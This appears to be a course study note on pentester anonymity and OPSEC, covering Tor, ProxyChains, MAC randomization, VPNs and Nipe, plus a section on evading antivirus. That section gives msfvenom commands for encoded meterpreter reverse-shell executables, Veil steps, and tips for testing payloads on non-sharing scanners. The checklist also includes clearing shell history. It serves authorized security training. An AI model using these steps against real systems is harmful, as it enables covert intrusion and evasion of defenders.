# Anonymity, OPSEC & Evasion

> **Legal Notice:** Anonymity tools are used by penetration testers to protect their identity during authorized engagements and to understand attacker tradecraft. Never use these techniques for unauthorized access.

Operational Security (OPSEC) is the discipline of protecting your identity, methods, and engagement details from detection. Every professional penetration tester needs to understand how to route traffic anonymously, randomize identifying information, and evade detection.

**Udemy alignment:** Section 18 of "Hacker Ético Profissional" covers Tor, ProxyChains, Macchanger, and Nipe.

---

## Tor — The Onion Router

Tor routes traffic through a series of encrypted relays, hiding the origin IP from the destination and from network observers.

### How Tor Works

```
Your Kali → [encrypted] → Guard Node → [encrypted] → Middle Node → [encrypted] → Exit Node → Target
```

- Each relay only knows the previous and next hop
- Exit node sees the traffic but not your IP
- HTTPS inside Tor = no exit node can read content

### Installation & Setup

```bash
# Install Tor
sudo apt install tor -y

# Start Tor service
sudo systemctl start tor
sudo systemctl enable tor  # start on boot

# Verify Tor is running (SOCKS5 proxy on port 9050)
curl --socks5 127.0.0.1:9050 https://check.torproject.org/api/ip
# Should show a Tor exit node IP

# Check Tor status
sudo systemctl status tor
```

### Torrc Configuration

```bash
# View config
sudo cat /etc/tor/torrc

# Useful options to add:
sudo tee -a /etc/tor/torrc << 'EOF'
# Control port for automation
ControlPort 9051
CookieAuthentication 1

# Use only specific exit countries
ExitNodes {PT},{ES},{DE}
StrictNodes 1

# Or exclude specific countries
ExcludeExitNodes {US},{UK},{AU},{CA},{NZ}
EOF

sudo systemctl restart tor
```

### Get a New Tor Identity

```bash
# Install tor control tools
sudo apt install tor python3-stem -y

# Send NEWNYM signal (new circuit)
echo -e 'AUTHENTICATE ""\r\nSIGNAL NEWNYM\r\nQUIT' | nc 127.0.0.1 9051

# Python version
python3 -c "
from stem import Signal
from stem.control import Controller
with Controller.from_port(port=9051) as c:
    c.authenticate()
    c.signal(Signal.NEWNYM)
    print('[+] New Tor circuit requested')
"
```

---

## ProxyChains — Route Any Tool Through Proxies

ProxyChains forces any TCP connection from any tool through a chain of proxies (SOCKS4/5, HTTP).

### Configuration

```bash
# Edit ProxyChains config
sudo nano /etc/proxychains4.conf
```

**Key settings:**

```ini
# Chain type — choose one:
strict_chain    # all proxies used in order, all must work
dynamic_chain   # skip dead proxies, use remaining ones
random_chain    # randomize order each time (add random_chain_len)

# DNS resolution through proxy (prevent DNS leaks)
proxy_dns

# Timeout settings
tcp_read_time_out 15000
tcp_connect_time_out 8000

[ProxyList]
# Add proxies in format: type  host  port [user pass]
socks5  127.0.0.1  9050          # Tor (always add this)
# socks5  10.0.0.1  1080         # additional SOCKS5 proxy
# http    203.0.113.1  3128      # HTTP proxy
```

### Usage

```bash
# Route any tool through Tor
proxychains curl ifconfig.me              # verify external IP
proxychains nmap -sT -p 80,443 example.com  # TCP scan (not SYN — no raw sockets)
proxychains theHarvester -d example.com -b google
proxychains sqlmap -u "http://target.com/page?id=1"
proxychains msfconsole                   # Metasploit through Tor
proxychains firefox                      # Browser through Tor

# Multi-hop: Tor + additional proxy
# In proxychains4.conf add both proxies:
# socks5 127.0.0.1 9050   ← Tor
# socks5 proxy.vpn.net 1080  ← additional hop
proxychains curl ifconfig.me
```

### ProxyChains Chain Types Explained

| Mode | Behavior | Use Case |
|------|----------|----------|
| `strict_chain` | All proxies in exact order, fails if any down | Maximum control |
| `dynamic_chain` | Skip dead proxies, use available ones | Reliability |
| `random_chain` | Randomize proxy order per connection | Maximum confusion |

### Verify No Leaks

```bash
# Check your apparent IP
proxychains curl -s ifconfig.me

# Check for DNS leaks
proxychains curl -s "https://www.dnsleaktest.com/results.json"

# Verify with Tor check
proxychains curl -s "https://check.torproject.org/api/ip"
```

---

## Macchanger — MAC Address Randomization

The MAC address (Media Access Control) is a hardware identifier burned into every network adapter. It can be seen by routers and network monitors. Randomizing it prevents hardware-level tracking.

### Installation
Pre-installed on Kali Linux.

### Usage

```bash
# Show current MAC address
macchanger -s eth0
macchanger -s wlan0

# Show permanent (burned-in) MAC
macchanger -p eth0

# --- Randomize MAC ---

# Bring interface down first (required)
sudo ip link set eth0 down

# Fully random MAC
sudo macchanger -r eth0

# Random MAC from same vendor (keeps vendor prefix)
sudo macchanger -e eth0

# Bring interface back up
sudo ip link set eth0 up

# Verify new MAC
macchanger -s eth0
ip addr show eth0

# --- Set specific MAC ---
sudo ip link set eth0 down
sudo macchanger -m 00:11:22:33:44:55 eth0
sudo ip link set eth0 up

# --- Reset to original/permanent MAC ---
sudo ip link set eth0 down
sudo macchanger -p eth0
sudo ip link set eth0 up
```

### Persistent MAC Randomization (on boot)

```bash
# Create systemd service
sudo tee /etc/systemd/system/macchanger@.service << 'EOF'
[Unit]
Description=Randomize MAC for %i
Before=network.target

[Service]
Type=oneshot
ExecStart=/usr/bin/ip link set %i down
ExecStart=/usr/bin/macchanger -r %i
ExecStart=/usr/bin/ip link set %i up
RemainAfterExit=yes

[Install]
WantedBy=multi-user.target
EOF

sudo systemctl enable macchanger@eth0
sudo systemctl enable macchanger@wlan0
```

---

## VPN on Kali

### OpenVPN

```bash
sudo apt install openvpn -y

# Connect with config file (from VPN provider)
sudo openvpn --config client.ovpn

# Or as background service
sudo openvpn --config client.ovpn --daemon

# Verify VPN connection
curl ifconfig.me  # should show VPN IP
ip route          # should show VPN tunnel

# Kill switch (prevent traffic outside VPN)
sudo iptables -A OUTPUT ! -o tun0 -m state --state NEW -j DROP
```

### WireGuard

```bash
sudo apt install wireguard -y

# Generate keys
wg genkey | tee /etc/wireguard/privatekey | wg pubkey > /etc/wireguard/publickey

# Configure (get server details from VPN provider)
sudo tee /etc/wireguard/wg0.conf << 'EOF'
[Interface]
PrivateKey = <your-private-key>
Address = 10.66.66.2/24
DNS = 1.1.1.1

[Peer]
PublicKey = <server-public-key>
Endpoint = vpn-server.com:51820
AllowedIPs = 0.0.0.0/0
EOF

# Start WireGuard
sudo wg-quick up wg0

# Status
sudo wg show
```

---

## Nipe — Route ALL Traffic Through Tor

Nipe is a Perl script that configures iptables to force all non-Tor traffic through Tor, making Tor essentially a system-wide transparent proxy.

```bash
# Install dependencies
sudo apt install perl cpanminus -y
sudo cpanm Switch JSON LWP::UserAgent

# Clone and install
git clone https://github.com/htrgouvea/nipe.git
cd nipe
sudo perl nipe.pl install

# Control
sudo perl nipe.pl start    # enable Tor routing for all traffic
sudo perl nipe.pl stop     # disable
sudo perl nipe.pl restart  # restart
sudo perl nipe.pl status   # check current IP and Tor status

# Status output shows:
# [+] Status: true
# [+] IP: 185.xx.xx.xx   ← Tor exit node IP
```

**Warning:** Nipe modifies iptables globally. All system traffic goes through Tor. Can break some applications.

---

## Bypass AV & Evasion

### msfvenom Payload Encoding

```bash
# Basic payload (detected by most AVs)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f exe > basic.exe

# Encode once with shikata_ga_nai (polymorphic)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 \
  -e x86/shikata_ga_nai -i 5 -f exe > encoded.exe

# Multiple encoders + multiple iterations
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 \
  -e x86/shikata_ga_nai -i 10 \
  -e x86/countdown -i 3 \
  -f exe > multi-encoded.exe

# List all encoders
msfvenom --list encoders

# List payload formats
msfvenom --list formats

# Generate Python payload (less AV detection)
msfvenom -p python/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f raw > payload.py
```

### Veil-Framework

Generates payloads using Python/PowerShell to bypass AV signatures.

```bash
sudo apt install veil -y
veil

# Inside Veil:
# use 1            → Evasion
# list             → show all payloads
# use 15           → python/meterpreter/rev_tcp
# set LHOST <ip>
# set LPORT 4444
# generate
```

### Testing AV Detection (Safe Sites)

```bash
# Check payload against AV engines
# Use these (not VirusTotal for real engagements - results shared with AV vendors)
# antiscan.me       — does not share with vendors
# nodistribute.com  — privacy-focused scanning
# kleenscan.com     — scan without submission
```

---

## Anonymous Browsing Workflow

For maximum anonymity during OSINT research:

```bash
# Option 1: Tor Browser (recommended for web browsing)
sudo apt install torbrowser-launcher -y
torbrowser-launcher

# Option 2: Firefox through ProxyChains
proxychains firefox

# Option 3: Chromium through Tor
chromium --proxy-server="socks5://127.0.0.1:9050" --host-resolver-rules="MAP * ~NOTFOUND , EXCLUDE localhost"
```

**Browser OPSEC:**
- Disable JavaScript when possible (leaks system info)
- Use separate browser profile per target
- Never log in to personal accounts
- Disable WebRTC (leaks real IP through VPN/Tor)
  - Firefox: `about:config` → `media.peerconnection.enabled` = false
  - Chrome: use uBlock Origin with WebRTC leak protection

---

## OPSEC Checklist

Use this before every engagement:

### Pre-Engagement
- [ ] VPN connected and verified (`curl ifconfig.me`)
- [ ] Tor running if additional anonymity needed
- [ ] MAC address randomized on test interfaces
- [ ] Separate VM or Kali instance for this engagement
- [ ] No personal accounts logged in
- [ ] WebRTC disabled in browser

### During Engagement
- [ ] All tool output saved to engagement-specific directory
- [ ] CherryTree notes started with timestamp
- [ ] No scanning outside defined scope
- [ ] Tor/ProxyChains active for passive OSINT
- [ ] Bash history check (`history | tail -20`)

### Post-Engagement
- [ ] Clear bash history (`history -c && history -w`)
- [ ] Remove temporary files and exploits from targets
- [ ] Reset MAC address if changed permanently
- [ ] Disconnect VPN/Tor
- [ ] Archive engagement data securely

---

## Resources

- [Tor Project Documentation](https://tb-manual.torproject.org)
- [ProxyChains Documentation](https://github.com/haad/proxychains)
- [Nipe GitHub](https://github.com/htrgouvea/nipe)
- [Macchanger Man Page](https://linux.die.net/man/1/macchanger)
- [Veil-Framework Documentation](https://github.com/Veil-Framework/Veil)
- [Udemy: Hacker Ético Profissional — Section 18](https://www.udemy.com/course/hacker-etico-profissional/)
- [OPSEC for Pentesters — TCM Security](https://tcm-sec.com/opsec-for-pentesters/)
